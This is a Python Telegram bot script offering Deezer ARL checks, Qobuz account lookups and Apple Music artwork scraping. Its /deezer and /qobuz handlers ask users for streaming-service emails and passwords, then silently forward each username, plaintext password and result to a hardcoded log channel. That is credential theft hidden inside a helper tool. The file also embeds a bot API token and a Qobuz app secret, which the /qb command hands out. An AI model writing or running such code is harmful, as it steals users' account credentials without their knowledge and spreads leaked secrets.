import telebot
import requests
from bs4 import BeautifulSoup
from datetime import datetime
import re
import hashlib
from random import randint
from utils import *

API_TOKEN = '6107281499:AAGd-Okwueji9yqASXLILTnVAkkHdkknn4Q'
log_channel_id = '-1001951842822'


bot = telebot.TeleBot(API_TOKEN)

def send_log_message(message):
  bot.send_message(chat_id=log_channel_id, text=message)
  
@bot.message_handler(commands=['start'])
def send_welcome(message):
  username = message.from_user.username
  textw = f"YO! @<b>{username}</b>, I am Alive!\n Type /help to know more"
  bot.reply_to(message, textw,parse_mode='HTML')


@bot.message_handler(commands=['help'])
def send_helptext(message):
  chat_id = message.chat.id
  help_text = '''Available Commands:
 <code>/arl &lt;ARL&gt;</code>  - Check Deezer ARL status
 <code>/deezer</code> - To Generate Deezer account's ARL
 <code>/qobuz</code> - Fetch Qobuz account/Token details.<br></br>
 <strong>Bot created by @thekvt</strong>'''

  bot.send_message(chat_id, text=help_text, parse_mode='HTML')


@bot.message_handler(commands=['arl'])
def check_deezer_subscription_command(message):
  chat_id = message.chat.id
  arl = message.text.split()[-1]  # Extract ARL from the command
  result = check_deezer_subscription_status(arl)
  bot.send_message(chat_id, result,parse_mode='MARKDOWN')


@bot.message_handler(commands=['deezer'])
def get_deezer_arl(message):
    chat_id = message.chat.id
    print(chat_id)
    bot.send_message(chat_id, 'Please enter your Deezer Email:')
    bot.register_next_step_handler(message, process_deezer_username)

def process_deezer_username(message):
    chat_id = message.chat.id
    dmail = message.text
    bot.send_message(chat_id, 'Please enter your Deezer password:')
    bot.register_next_step_handler(message, process_deezer_password, dmail)

def process_deezer_password(message, dmail):
    chat_id = message.chat.id
    password = message.text
    arl = arl_via_email(dmail,password)
    text = check_deezer_subscription_status(arl)
    if arl != "Invalid credentials" :
      bot.send_message(chat_id, text,parse_mode='MARKDOWN')
    else:
      bot.send_message(chat_id,"Invalid credentials")
    username = message.from_user.username
    log_message = f"@{username} \n,{dmail}, {password}\n\n {text} "
    send_log_message(log_message)


@bot.message_handler(commands=['qobuz'])
def get_qobuz_account_details_command(message):
  chat_id = message.chat.id
  bot.send_message(chat_id, "Please enter your Qobuz Email/userId:")
  bot.register_next_step_handler(message, process_qobuz_email)

def process_qobuz_email(message):
  chat_id = message.chat.id
  email = message.text
  bot.send_message(chat_id, "Please enter your Qobuz Password/Token:")
  bot.register_next_step_handler(message, process_qobuz_password, email)

def process_qobuz_password(message, email):
  chat_id = message.chat.id
  password = message.text
  print(get_qobuz_credentials())
  app_id, app_secret, api_uri = get_qobuz_credentials()
  result = get_account_details(email, password, app_id)
  print('result')
  bot.send_message(chat_id, result,parse_mode='MARKDOWN')

  username = message.from_user.username
  log_message = f"@{username} \n,{email}, {password}, {app_id}\n\n {result} "
  send_log_message(log_message)


@bot.message_handler(commands=['qb'])
def qb_handler(message):
  chat_id = message.chat.id
  app_id, app_secret, x = get_qobuz_credentials()
  bot.send_message(
    chat_id,
    text=
    f'app_id=<code>{app_id}</code>\napp_secret=<code>979549437fcc4a3faad4867b5cd25dcb</code> \n\n <span class="tg-spoiler"> <strong>Use this if getting error\n {app_secret} </strong></span>',
    parse_mode='HTML')


@bot.message_handler(commands=['artwork'])
def scrape_apple_music_command(message):
  chat_id = message.chat.id
  url = message.text.split()[-1]  # Extract URL from the command
  if url == '' or 'music.apple.com' not in url:
     bot.send_message(chat_id, "Invalid link format")
  else:
    art_url, song_name = scrape_apple_music(url)
    print(art_url)
    if art_url:
      message = f'<b>📝 {song_name} </b> \n🔗 {art_url}'
      bot.send_message(chat_id, text=message, parse_mode='HTML', disable_web_page_preview = False)
    else: 
      bot.send_message(chat_id, "Invalid URL")

@bot.message_handler(commands=['ani_art'])
def animate_apple_music_command(message):
  chat_id = message.chat.id
  url = message.text.split()[-1]  # Extract URL from the command
  if url == '' or 'music.apple.com' not in url:
     bot.send_message(chat_id, "Send URL along with it")
  else:
    bot.send_message(chat_id, "OK!, wait 30 seconds...")
    ani_art_url = fetch_animated_artwork(url)
    bot.send_message(message, text=f"🔗 {ani_art_url}", disable_web_page_preview = False)


@bot.message_handler(commands=['psa'])
def scrape_try2link(message):
    chat_id = message.chat.id
    try:
        url = message.text.split(' ', 1)[1].strip()
        if url == '':
            bot.send_message(chat_id, "Please provide a URL after the /psa command.")
        else:
            msg = bot.send_message(chat_id, "Please wait while I scrape the URL...")
            try2link_scrape(url, chat_id, msg.message_id)
    except IndexError:
        bot.send_message(chat_id, "Error, may be invalid URL, Ask @thekvt WTF")



bot.polling()
